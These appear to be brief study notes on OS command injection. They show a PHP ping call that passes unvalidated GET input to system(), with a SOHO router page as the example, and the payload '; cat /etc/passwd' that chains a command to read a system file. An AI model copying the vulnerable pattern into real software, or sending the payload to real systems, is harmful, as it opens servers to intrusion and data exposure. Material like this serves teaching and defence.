### Application on the server is vulnerable,
### allowing execution of arbitrary commands
### User input not validated
### Common example is a SOHO router, with a web page to allow ping

system("ping -c 1 ".$_GET["ip"]);
###  ^^^contain the following in it’s code


### Run the following to chain/stack our arbitrary command
; cat /etc/passwd
